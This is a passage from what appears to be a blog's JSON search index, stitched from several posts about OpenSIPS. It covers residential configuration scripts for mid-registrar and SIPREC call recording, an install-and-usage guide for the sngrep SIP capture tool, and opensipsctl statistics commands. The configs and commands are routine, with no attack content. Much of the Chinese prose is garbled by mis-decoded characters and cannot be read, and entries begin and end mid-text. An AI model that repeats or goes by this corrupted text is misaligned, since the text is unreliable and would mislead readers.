exit; } t_relay(); exit; } # when routing via usrloc, log the missed calls also do_accounting(\u0026#34;log\u0026#34;,\u0026#34;missed\u0026#34;); route(relay); } route[relay] { # for INVITEs enable some additional helper routes if (is_method(\u0026#34;INVITE\u0026#34;)) { t_on_branch(\u0026#34;per_branch_ops\u0026#34;); t_on_reply(\u0026#34;handle_nat\u0026#34;); t_on_failure(\u0026#34;missed_call\u0026#34;); } if (!t_relay()) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Internal Error\u0026#34;); }; exit; } branch_route[per_branch_ops] { xlog(\u0026#34;new branch at $ru\\n\u0026#34;); } onreply_route[handle_nat] { xlog(\u0026#34;incoming reply\\n\u0026#34;); } failure_route[missed_call] { if (t_was_cancelled()) { exit; } # uncomment the following lines if you want to block client # redirect based on 3xx replies. ##if (t_check_status(\u0026#34;3[0-9][0-9]\u0026#34;)) { ##t_reply(\u0026#34;404\u0026#34;,\u0026#34;Not found\u0026#34;); ##\texit; ##} } ","permalink":"https://wdd.js.org/opensips/ch8/mid-register/","summary":"# # $Id$ # # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=4 log_stderror=yes log_facility=LOG_LOCAL0 children=4 /* uncomment the following line to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:10.","title":"mid-registrar"},{"content":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 log_stderror=no log_facility=LOG_LOCAL0 children=4 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:127.0.0.1:5060 ####### Modules Section ######## #set module path mpath=\u0026#34;modules/\u0026#34; #### SIGNALING module loadmodule \u0026#34;signaling.so\u0026#34; #### StateLess module loadmodule \u0026#34;sl.so\u0026#34; #### Transaction Module loadmodule \u0026#34;tm.so\u0026#34; modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timeout\u0026#34;, 5) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timeout\u0026#34;, 30) modparam(\u0026#34;tm\u0026#34;, \u0026#34;restart_fr_on_each_reply\u0026#34;, 0) modparam(\u0026#34;tm\u0026#34;, \u0026#34;onreply_avp_mode\u0026#34;, 1) #### Record Route Module loadmodule \u0026#34;rr.so\u0026#34; /* do not append from tag to the RR (no need for this script) */ modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) #### MAX ForWarD module loadmodule \u0026#34;maxfwd.so\u0026#34; #### SIP MSG OPerationS module loadmodule \u0026#34;sipmsgops.so\u0026#34; #### FIFO Management Interface loadmodule \u0026#34;mi_fifo.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_mode\u0026#34;, 0666) #### URI module loadmodule \u0026#34;uri.so\u0026#34; modparam(\u0026#34;uri\u0026#34;, \u0026#34;use_uri_table\u0026#34;, 0) #### USeR LOCation module loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;nat_bflag\u0026#34;, \u0026#34;NAT\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 0) #### REGISTRAR module loadmodule \u0026#34;registrar.so\u0026#34; modparam(\u0026#34;registrar\u0026#34;, \u0026#34;tcp_persistent_flag\u0026#34;, \u0026#34;TCP_PERSISTENT\u0026#34;) /* uncomment the next line not to allow more than 10 contacts per AOR */ #modparam(\u0026#34;registrar\u0026#34;, \u0026#34;max_contacts\u0026#34;, 10) #### ACCounting module loadmodule \u0026#34;acc.so\u0026#34; /* what special events should be accounted ? */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) /* by default we do not adjust the direct of the sequential requests. if you enable this parameter, be sure the enable \u0026#34;append_fromtag\u0026#34; in \u0026#34;rr\u0026#34; module */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) loadmodule \u0026#34;proto_udp.so\u0026#34; loadmodule \u0026#34;dialog.so\u0026#34; loadmodule \u0026#34;b2b_entities.so\u0026#34; loadmodule \u0026#34;siprec.so\u0026#34; loadmodule \u0026#34;rtpproxy.so\u0026#34; modparam(\u0026#34;rtpproxy\u0026#34;, \u0026#34;rtpproxy_sock\u0026#34;, \u0026#34;udp:127.0.0.1:7899\u0026#34;) ####### Routing Logic ######## # main request routing logic route{ if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; } if (has_totag()) { # handle hop-by-hop ACK (no routing required) if ( is_method(\u0026#34;ACK\u0026#34;) \u0026amp;\u0026amp; t_check_trans() ) { t_relay(); exit; } # sequential request within a dialog should # take the path determined by record-routing if ( !loose_route() ) { # we do record-routing for all our traffic, so we should not # receive any sequential requests without Route hdr. sl_send_reply(\u0026#34;404\u0026#34;,\u0026#34;Not here\u0026#34;); exit; } if (is_method(\u0026#34;BYE\u0026#34;)) { # do accounting even if the transaction fails do_accounting(\u0026#34;log\u0026#34;,\u0026#34;failed\u0026#34;); } # route it out to whatever destination was set by loose_route() # in $du (destination URI). route(relay); exit; } # CANCEL processing if (is_method(\u0026#34;CANCEL\u0026#34;)) { if (t_check_trans()) t_relay(); exit; } t_check_trans(); if ( !(is_method(\u0026#34;REGISTER\u0026#34;) ) ) { if (is_myself(\u0026#34;$fd\u0026#34;)) { } else { # if caller is not local, then called number must be local if (!is_myself(\u0026#34;$rd\u0026#34;)) { send_reply(\u0026#34;403\u0026#34;,\u0026#34;Rely forbidden\u0026#34;); exit; } } } # preloaded route checking if (loose_route()) { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Attempt to route with preloaded Route\u0026#39;s [$fu/$tu/$ru/$ci]\u0026#34;); if (!is_method(\u0026#34;ACK\u0026#34;)) sl_send_reply(\u0026#34;403\u0026#34;,\u0026#34;Preload Route denied\u0026#34;); exit; } # record routing if (!is_method(\u0026#34;REGISTER|MESSAGE\u0026#34;)) record_route(); # account only INVITEs if (is_method(\u0026#34;INVITE\u0026#34;)) { create_dialog(); rtpproxy_engage(); siprec_start_recording(\u0026#34;sip:127.0.0.1:5090\u0026#34;); do_accounting(\u0026#34;log\u0026#34;); } if (!is_myself(\u0026#34;$rd\u0026#34;)) { append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); route(relay); } # requests for my domain if (is_method(\u0026#34;PUBLISH|SUBSCRIBE\u0026#34;)) { sl_send_reply(\u0026#34;503\u0026#34;, \u0026#34;Service Unavailable\u0026#34;); exit; } if (is_method(\u0026#34;REGISTER\u0026#34;)) { if (!save(\u0026#34;location\u0026#34;)) sl_reply_error(); exit; } if ($rU==NULL) { # request with no Username in RURI sl_send_reply(\u0026#34;484\u0026#34;,\u0026#34;Address Incomplete\u0026#34;); exit; } # do lookup with method filtering if (!lookup(\u0026#34;location\u0026#34;,\u0026#34;m\u0026#34;)) { t_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); exit; } # when routing via usrloc, log the missed calls also do_accounting(\u0026#34;log\u0026#34;,\u0026#34;missed\u0026#34;); route(relay); } route[relay] { # for INVITEs enable some additional helper routes if (is_method(\u0026#34;INVITE\u0026#34;)) { t_on_branch(\u0026#34;per_branch_ops\u0026#34;); t_on_reply(\u0026#34;handle_nat\u0026#34;); t_on_failure(\u0026#34;missed_call\u0026#34;); } if (!t_relay()) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Internal Error\u0026#34;); }; exit; } branch_route[per_branch_ops] { xlog(\u0026#34;new branch at $ru\\n\u0026#34;); } onreply_route[handle_nat] { xlog(\u0026#34;incoming reply\\n\u0026#34;); } failure_route[missed_call] { if (t_was_cancelled()) { exit; } # uncomment the following lines if you want to block client # redirect based on 3xx replies. ##if (t_check_status(\u0026#34;3[0-9][0-9]\u0026#34;)) { ##t_reply(\u0026#34;404\u0026#34;,\u0026#34;Not found\u0026#34;); ##\texit; ##} } ","permalink":"https://wdd.js.org/opensips/ch8/siprec/","summary":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 log_stderror=no log_facility=LOG_LOCAL0 children=4 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:127.","title":"siprec"},{"content":"1. å®‰è£… 1.1. centos vim /etc/yum.repos.d/irontec.repo\n[irontec] name=Irontec RPMs repository baseurl=http://packages.irontec.com/centos/$releasever/$basearch/ rpm \u0026ndash;import http://packages.irontec.com/public.keyyum install sngrep\n1.2 debian/ubuntu # debian å®‰è£…sngrep echo \u0026#34;deb http://packages.irontec.com/debian jessie main\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list wget http://packages.irontec.com/public.key -q -O - | apt-key add - apt-get install sngrep -y debian buster å³ debian10ä»¥ä¸Šå¯ä»¥ç›´æ¥ apt-get install sngrepÂ 1.3 arch/manjaro yay -Syu sngrep å‚è€ƒï¼š https://aur.archlinux.org/packages/sngrep/\nå¦‚æœæŠ¥é”™ï¼Œç¼–è¾‘ /etc/makepkg.confæ–‡ä»¶ï¼Œåˆ é™¤å…¶ä¸­çš„-Werror=format-security\nCFLAGS=\u0026#34;-march=x86-64 -mtune=generic -O2 -pipe -fno-plt -fexceptions \\ -Wp,-D_FORTIFY_SOURCE=2 -Wformat -Werror=format-security \\ -fstack-clash-protection -fcf-protection\u0026#34; 2. å‘½ä»¤è¡Œå‚æ•° sngrep [-hVcivNqrD] [-IO pcap_dump] [-d dev] [-l limit] [-k keyfile] [-LH capture_url] [\u0026lt;match expression\u0026gt;] [\u0026lt;bpf filter\u0026gt;] -h --help: æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ -V --version: æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ -d --device: æŒ‡å®šæŠ“åŒ…çš„ç½‘å¡ -I --input: ä»pacpæ–‡ä»¶ä¸­è§£æsipåŒ… -O --output: è¾“å‡ºæ•è·çš„åŒ…åˆ°pacpæ–‡ä»¶ä¸­ -c --calls: ä»…æ˜¾ç¤ºinviteæ¶ˆæ¯ -r --rtp: Capture RTP packets payload æ•è·rtpåŒ… -l --limit: é™åˆ¶æ•è·å¯¹è¯çš„æ•°é‡ -i --icase: ä½¿å¤§å°å†™ä¸æ•æ„Ÿ -v --invert: é¢ å€’ï¼ˆä¸å¤ªæ˜ç™½ï¼‰ -N --no-interface: Don\u0026rsquo;t display sngrep interface, just capture -q --quiet: Don\u0026rsquo;t print captured dialogs in no interface mode -D --dump-config: Print active configuration settings and exit -f --config: Read configuration from file -R --rotate: Rotate calls when capture limit have been reached. -H --eep-send: Homer sipcapture url (udp:X.X.X.X:XXXX) -L --eep-listen: Listen for encapsulated packets (udp:X.X.X.X:XXXX) -k --keyfile: RSA private keyfile to decrypt captured packets 3. é¡µé¢ sngrepæœ‰å››ä¸ªé¡µé¢ï¼Œæ¯ä¸ªé¡µé¢éƒ½æœ‰ä¸€äº›ä¸åŒçš„å¿«æ·é”®ã€‚\nå‘¼å«åˆ—è¡¨é¡µé¢ å‘¼å«æµç¨‹é¡µé¢ åŸå§‹å‘¼å«ä¿¡æ¯é¡µé¢ ä¿¡æ¯å¯¹æ¯”é¡µé¢ 3.1 å‘¼å«åˆ—è¡¨é¡µé¢ å¿«æ·é”®\nArrow keys: Move through the listï¼Œé™¤äº†ä¸Šä¸‹ç®­å¤´è¿˜å¯ä»¥ä½¿ç”¨j,kæ¥ç§»åŠ¨å…‰æ ‡ Enter: Display current or selected dialog(s) message flow A: Auto scroll to new callsï¼Œè‡ªåŠ¨æ»šåŠ¨åˆ°æ–°çš„call F2 or s: Save selected/all dialog(s) to a PCAP file, ä¿å­˜dialogåˆ°pacpæ–‡ä»¶ F3 or / or TAB: Enter a display filter. This filter will be applied to the text lines in the listï¼Œè¿›å…¥æœç´¢ F4 or x: Display current selected dialog and its related one. å›åˆ°ç¬¬ä¸€ä¸ªsipæ¶ˆæ¯ä¸Š F5: Clear call list, æ¸…ç©ºå‘¼å«åˆ—è¡¨ F6 or r: Display selected dialog(s) messages in raw text, æ˜¾ç¤ºåŸå§‹çš„sipæ¶ˆæ¯ F7 or f: Show advanded filters dialogs æ˜¾ç¤ºé«˜çº§è¿‡æ»¤å¼¹çª— F9 or l: Turn on/off address resolution if enabled F10 or t: Select displayed columns, æ˜¾ç¤ºæˆ–è€…éšè—ä¾§è¾¹sipæ¶ˆæ¯æ  å‘¼å«åˆ—è¡¨é¡µé¢è¿˜èƒ½å¤Ÿæ˜¾ç¤ºä¸¤ä¸ªå¼¹çª—, æŒ‰få¯ä»¥æ˜¾ç¤ºé«˜çº§è¿‡æ»¤é…ç½®\næŒ‰tå¯ä»¥æ˜¾ç¤º, è‡ªå®šä¹‰å‘¼å«åˆ—é€‰é¡¹å¼¹çª—\n3.2 å‘¼å«æµç¨‹é¡µé¢ å¿«æ·é”®\n**Keybindings:\nArrow keys: Move through messages Enter: Display current message raw (so you can copy payload) F2 or d: æ˜¾ç¤ºsdpæ¶ˆæ¯ï¼Œf2çš„æŸä¸ªæ¨¡å¼ä¼šè®©æ—¶åºå›¾æ›´ç´§å‡‘ F3 or t: æ˜¾ç¤ºæˆ–è€…å…³é—­sipä¾§è¾¹æ  F4 or x: å›åˆ°é¡¶éƒ¨ F5 or s: æ¯ä¸ªipåœ°å€ä»…ä»…æ˜¾ç¤ºä¸€åˆ— F6 or R: æ˜¾ç¤ºåŸå§‹çš„sipæ¶ˆæ¯ F7 or c: æ”¹å˜é¢œè‰²æ¨¡å¼, æœ‰çš„é¢œè‰²æ¨¡å¼å¾ˆå®¹æ˜“è®©äººæ— æ³•åŒºåˆ†å½“å‰æŸ¥çœ‹çš„sipæ¶ˆæ¯æ˜¯å“ªä¸€ä¸ªï¼Œæ‰€ä»¥éœ€è¦æ”¹å˜é¢œè‰²æ¨¡å¼ F9 or l: Turn on/off address resolution if enabled 9 and 0: å¢åŠ æˆ–è€…å‡å°‘ä¾§è¾¹æ çš„å®½åº¦ T: é‡ç»˜ä¾§è¾¹æ  D: ä»…æ˜¾ç¤ºå¸¦æœ‰sdpçš„æ¶ˆæ¯ ç©ºæ ¼é”®ï¼šé€‰ä¸­ä¸€ä¸ªsipæ¶ˆæ¯ï¼Œå†æ¬¡æ‰¾ä¸ªsipæ¶ˆæ¯ï¼Œç„¶åå°±ä¼šè¿›å…¥å¯¹æ¯”æ¨¡å¼ F1 or h: æ˜¾å¼å¸®åŠ©ä¿¡æ¯é¡µé¢ 3.3 åŸå§‹sipæ¶ˆæ¯ç•Œé¢ 3.3 æ¶ˆæ¯å¯¹æ¯”ç•Œé¢ åœ¨å‘¼å«åˆ—è¡¨é¡µé¢æŒ‰ç©ºæ ¼é”®é€‰ä¸­ä¸€ä¸ªæ¶ˆæ¯ï¼Œç„¶åé€‰æ‹©å¦å¤–ä¸€ä¸ªsipæ¶ˆæ¯åï¼Œå†æ¬¡æŒ‰ç©ºæ ¼é”®ï¼Œå°±å¯ä»¥è¿›å…¥æ¶ˆæ¯å¯¹æ¯”é¡µé¢\n4. åˆ†æåª’ä½“é—®é¢˜ ä½¿ç”¨ sngrep -rÂ å¯ä»¥ç”¨æ¥æ•è·åª’ä½“æµï¼Œé»˜è®¤ä¸åŠ  -rÂ åˆ™åªèƒ½æ˜¾ç¤ºä¿¡ä»¤ã€‚\nåœ¨å‘¼å«æµç¨‹é¡µé¢ï¼ŒæŒ‰ä¸‹F3, å¯ä»¥åŠ¨æ€çš„æŸ¥çœ‹åª’ä½“æµçš„æƒ…å†µã€‚åœ¨åˆ†æè¯­éŸ³é—®é¢˜æ—¶ï¼Œè¿™æ˜¯éå¸¸æ–¹ä¾¿çš„åˆ†æå·¥å…·ã€‚ 5. æ‰©å±•æŠ€æ³• 5.1 æ— ç•Œé¢æ¨¡å¼ å‡å¦‚è¯´æœ‰ä¸ªå¾ˆå¤§çš„è¯­éŸ³æ–‡ä»¶ï¼Œå‡å¦‚è¯´æœ‰1.5Gå§ï¼Œå¦‚æœç”¨wiresharkç›´æ¥æ‰“å¼€ï¼Œæœ‰å¯èƒ½wiresharkç›´æ¥å¡æ­»ï¼Œä¹Ÿæœ‰å¯èƒ½åœ¨æœç´¢çš„æ—¶å€™å°±å´©æºƒäº†ã€‚\nå³ä½¿æœ‰sngrepæ¥ç›´æ¥è¯»å–pcapæ–‡ä»¶ï¼Œä¹Ÿå¯èƒ½ä¼šéå¸¸æ…¢ã€‚\nå‡å¦‚è¯´æˆ‘ä»¬åªæƒ³ä»è¿™1.5Gæ–‡ä»¶ä¸­æ‰¾åˆ°æœ¬å«å·ç åŒ…å«1234çš„ï¼Œåº”è¯¥æ€ä¹ˆå¤„ç†å‘¢ï¼Ÿ\nç”¨ä¸‹é¢çš„å‘½ä»¤å°±å¯ä»¥ï¼š\nsngrep -rI test.pcap 1234 -N -O dst.pcap Dialog count: 17 -r è¯»åŒºè¯­éŸ³æµ -I ä»pcapæ–‡ä»¶ä¸­è¯»å– -N ä¸è¦ç•Œé¢ -O å°†åŒ¹é…çš„ç»“æœå†™åˆ°å…¶ä»–æ–‡ä»¶ä¸­ ç»è¿‡ä¸Šé¢çš„å‘½ä»¤ï¼Œä¸€ä¸ªå¾ˆå¤§çš„pcapæ–‡ä»¶ï¼Œåœ¨å¤„ç†ä¹‹åï¼Œå°±ä¼šå˜æˆæˆ‘ä»¬å…³å¿ƒçš„å°çš„åŒ…æ–‡ä»¶ã€‚æ¯”è¾ƒå®¹æ˜“å¤„ç†äº†ã€‚\n5.2 ä¸ªæ€§åŒ–é…ç½® åœ¨å‘¼å«åˆ—è¡¨ç•Œé¢ï¼ŒæŒ‰F8å¯ä»¥è¿›å…¥åˆ°ä¸ªæ€§åŒ–é…ç½®ç•Œé¢ï¼Œå¦‚ä¸‹ï¼š\nä¸ªæ€§åŒ–é…ç½®é¡µé¢æœ‰ä¸‰ä¸ªTabé¡µé¢, ä¸‰ä¸ªé¡µé¢å¯ä»¥ç”¨ç¿»é¡µçš„pageUpï¼Œ pageDownæ¥åˆ‡æ¢ã€‚åœ¨macbookä¸Šå¯èƒ½æ²¡æœ‰ç¿»é¡µé”®ï¼Œé‚£ä½ è¦ç”¨fn + ä¸Šä¸‹æ–¹å‘é”® æ¥ç¿»é¡µ\nInterface Capture Call Flow åœ¨æ¯ä¸ªé¡µé¢å¯ä»¥ç”¨ä¸Šä¸‹é”®æ¥é€‰æ‹©ä¸åŒçš„è®¾ç½®é¡¹ï¼ŒæŒ‰å·¦å³é”®æ”¹å˜å¯¹åº”çš„å€¼ã€‚ä¹Ÿå¯ä»¥æŒ‰ç©ºæ ¼é”®æ¥æ”¹å˜å¯¹åº”çš„å€¼ã€‚\nåœ¨æ¯ä¸ªTabé¡µé¢ï¼Œå¯ä»¥æŒ‰Tabé”®åœ¨è®¾ç½®é¡¹å’Œä¸‹é¢çš„Acceptå’ŒSaveã€Cancelä¹‹é—´åˆ‡æ¢ã€‚\næˆ‘ä»¬çš„ä¸ªæ€§åŒ–é…ç½®å¯ä»¥ç”¨Saveæ¥ä¿å­˜ä¸‹æ¥ï¼Œä¸ç„¶æ¯æ¬¡éƒ½è¦å†è®¾ç½®ä¸€è¾¹ã€‚\n1. interface é¡µé¢ 2. Captureè®¾ç½®ç•Œé¢ é…ç½®æŠ“åŒ…ç›¸å…³çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æœ€å¤§æŠ“åŒ…çš„æ•°é‡ï¼Œç½‘å¡è®¾å¤‡ï¼Œæ˜¯å¦å¯ç”¨äº‹åŠ¡ï¼Œé»˜è®¤çš„ä¿å­˜æ–‡ä»¶è·¯å¾„ç­‰ç­‰ã€‚ 3. Call Flowé¡µé¢ è¿™ä¸ªé¡µé¢ç”¨æ¥è®¾ç½®å‘¼å«æ—¶åºå›¾é¡µé¢ã€‚å°±ä¸å†è¿‡å¤šä»‹ç»ã€‚\næˆ‘ç”¨çš„æ¯”è¾ƒå¤šçš„ï¼Œå¯èƒ½æ˜¯Merge Columns witch same addrsssã€‚ sngrepé»˜è®¤ç”¨IP:PORTä½œä¸ºæ—¶åºå›¾ä¸­çš„ä¸€ä¸ªç«–çº¿ã€‚ä½†æ˜¯å¦‚æœIPç›¸åŒï¼Œç«¯å£å·ä¸åŒã€‚sngrepå°±ä¼šåˆ’å‡ºå¾ˆå¤šç«–çº¿ã€‚å¯ç”¨äº†æ”¹é¡¹ä¹‹åï¼Œå°±åªä¼šæ ¹æ®IPæ¥åˆ’ç«–çº¿ã€‚ åŒºåˆ†IPå’Œç«¯å£ï¼š Merge columns with same address on è¡¨ç¤ºåªæ ¹æ®IPæ¥åˆ’ç«–çº¿ off è¡¨ç¤ºæ ¹æ®IP:PORTæ¥åˆ’çº¿ï¼Œå¦‚æœä½ æƒ³åœ¨ç«–çº¿ä¸Šèƒ½çœ‹åˆ°ç«¯å£ä¿¡æ¯ï¼Œåˆ™éœ€è¦è®¾ç½®ä¸ºoff å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒMerge columns with same address: off å¦‚ä½•æ›´å®¹æ˜“åŒºåˆ†å½“å‰æ˜¯åœ¨å“ªä¸€ä¿¡ä»¤ä¸Šï¼Ÿ æœ‰æ—¶å€™ç§»åŠ¨çš„å¿«ä¸€ç‚¹ï¼Œä¾‹å¦‚åªèƒ½çœ‹åˆ°SIPæ¶ˆæ¯æ˜¯REGISTER, ä½†æ˜¯å…·ä½“æ˜¯å“ªä¸€ä¸ªREGISTERï¼Œ çœ‹çš„çœ¼ç–¼ä¹ŸåŒºåˆ†ä¸å‡ºæ¥ã€‚ è¿™æ—¶å€™Call Flowä¸­çš„Selected message highlightå°±æ´¾ä¸Šç”¨åœºã€‚\nblod åŠ ç²— reverse åè‰² reverseblod åè‰²å¹¶ä¸”åŠ ç²— ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œreverseæˆ–è€…reverseblodéƒ½èƒ½è®©ä½ æ›´å¥½çš„åŒºåˆ†ï¼Œä¸‹é¢å°±æ˜¯ä½¿ç”¨reverseræ¨¡å¼ä¸‹çš„æ—¶åºå›¾\nå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œç¬¬ä¸‰ä¸ªREGISTERçš„èƒŒæ™¯è‰²å˜ä¸€å¤§å—ï¼Œæ‰€ä»¥å½“å‰å°±æ˜¯åœ¨ç¬¬ä¸‰ä¸ªREGISTERä¿¡ä»¤ä¸Šã€‚ 4. è‡ªå®šä¹‰å‘¼å«åˆ—è¡¨çš„å­æ®µ åŸå§‹çš„å‘¼å«åˆ—è¡¨é¡µé¢å¯èƒ½åªæœ‰å¦‚ä¸‹7ä¸ªå­æ®µï¼Œç°åœ¨æˆ‘æƒ³å¢åŠ å…¶ä»–å­æ®µã€‚\nå¯ä»¥æŒ‰F10ï¼Œç„¶åå¼¹å‡ºåˆ—é€‰æ‹©å­æ®µã€‚\nå¯ä»¥ç”¨ + å’Œ - ç§»åŠ¨åˆ—çš„æ˜¾ç¤ºé¡ºåº å¯ä»¥ç”¨ç©ºæ ¼é”®æ¥æ˜¾ç¤ºå’Œéšè—å¯¹åº”çš„å­æ®µ å¦‚ä¸‹æˆ‘å¢åŠ äº†Timeå­æ®µï¼Œå¹¶ç§»åŠ¨åˆ°äº†ç¬¬ä¸€åˆ— åº”ç”¨ä¹‹åï¼Œç¬¬ä¸€åˆ—å°±æ˜¯timeå­æ®µäº† 6 . sngrepä½¿ç”¨æ³¨æ„ç‚¹ ä¸è¦é•¿æ—¶é—´ç”¨sngrepæŠ“åŒ…ï¼Œå¦åˆ™sgrepä¼šå ç”¨éå¸¸å¤šçš„å†…å­˜ã€‚å¦‚æœå¿…é¡»æŠ“ä¸€æ®µæ—¶é—´çš„åŒ…ï¼ŒåŠ¡å¿…ä½¿ç”¨tcpdumpã€‚ æŸäº›æƒ…å†µä¸‹ï¼Œsngrepä¼šä¸¢åŒ… æŸäº›æƒ…å†µä¸‹ï¼Œsngrepä¼šä»€ä¹ˆåŒ…éƒ½æŠ“åŒ…ä¸åˆ°ï¼Œæ³¨æ„æ­¤æ—¶å¾ˆå¯èƒ½è¦ä½¿ç”¨-då»æŒ‡å®šæŠ“åŒ…çš„ç½‘å¡ sngrepåªèƒ½æ•è·æœ¬æœºç½‘å¡çš„æ”¶åˆ°å’Œå‘é€çš„æµé‡ã€‚å‡å¦‚ABCåˆ†åˆ«æ˜¯ä¸‰å°ç‹¬ç«‹è™šæ‹Ÿæœºçš„SIPæœåŠ¡å™¨ï¼Œåœ¨Bä¸ŠæŠ“åŒ…åªèƒ½åˆ†æA-B, å’ŒB-Cç›´æ¥çš„æµé‡ã€‚ å†æ¬¡å¼ºè°ƒï¼šsngrepä¸é€‚åˆé•¿æ—¶é—´æŠ“åŒ…ï¼Œåªé€‚åˆçŸ­æ—¶é—´æŠ“åŒ…åˆ†æé—®é¢˜ã€‚å¦‚æœä½ éœ€è¦è®°å½•æ‰€æœ‰çš„sipæ¶ˆæ¯ï¼Œå¹¶å±•ç¤ºã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨siphubï¼Œæˆ–è€…homerã€‚ ","permalink":"https://wdd.js.org/opensips/tools/sngrep/","summary":"1. å®‰è£… 1.1. centos vim /etc/yum.repos.d/irontec.repo\n[irontec] name=Irontec RPMs repository baseurl=http://packages.irontec.com/centos/$releasever/$basearch/ rpm \u0026ndash;import http://packages.irontec.com/public.keyyum install sngrep\n1.2 debian/ubuntu # debian å®‰è£…sngrep echo \u0026#34;deb http://packages.irontec.com/debian jessie main\u0026#34; \u0026gt;\u0026gt; /etc/apt/sources.list wget http://packages.irontec.com/public.key -q -O - | apt-key add - apt-get install sngrep -y debian buster å³ debian10ä»¥ä¸Šå¯ä»¥ç›´æ¥ apt-get install sngrepÂ 1.3 arch/manjaro yay -Syu sngrep å‚è€ƒï¼š https://aur.archlinux.org/packages/sngrep/\nå¦‚æœæŠ¥é”™ï¼Œç¼–è¾‘ /etc/makepkg.confæ–‡ä»¶ï¼Œåˆ é™¤å…¶ä¸­çš„-Werror=format-security\nCFLAGS=\u0026#34;-march=x86-64 -mtune=generic -O2 -pipe -fno-plt -fexceptions \\ -Wp,-D_FORTIFY_SOURCE=2 -Wformat -Werror=format-security \\ -fstack-clash-protection -fcf-protection\u0026#34; 2.","title":"sngrep: æœ€å¥½ç”¨çš„sipå¯è§†åŒ–æŠ“åŒ…å·¥å…·"},{"content":"**opensipsctl fifo get_statistics all **å‘½ä»¤å¯ä»¥è·å–æ‰€æœ‰ç»Ÿè®¡æ•°æ®ï¼Œåœ¨æ‰€æœ‰ç»Ÿè®¡æ•°æ®ä¸­ï¼Œæˆ‘ä»¬åªå…³å¿ƒå†…å­˜ï¼Œäº‹åŠ¡å’Œå›è¯çš„æ•°é‡ã€‚ç„¶åå°†æ•°æ®ä½¿ç”¨curlå·¥å…·å†™å…¥åˆ°influxdbä¸­ã€‚\nopensipsctl fifo reset_statistics all é‡ç½®ç»Ÿè®¡æ•°æ®\nå¸¸ç”¨æŒ‡ä»¤ å‘½ä»¤ æè¿° opensipsctl fifo which æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨å‘½ä»¤ opensipsctl fifo ps æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ opensipsctl fifo get_statistics all è·å–æ‰€æœ‰ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics core: è·å–å†…æ ¸ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics net: è·å–ç½‘è·¯ç»Ÿè®¡ä¿¡æ¯ opensipsctl fifo get_statistics pkmem: 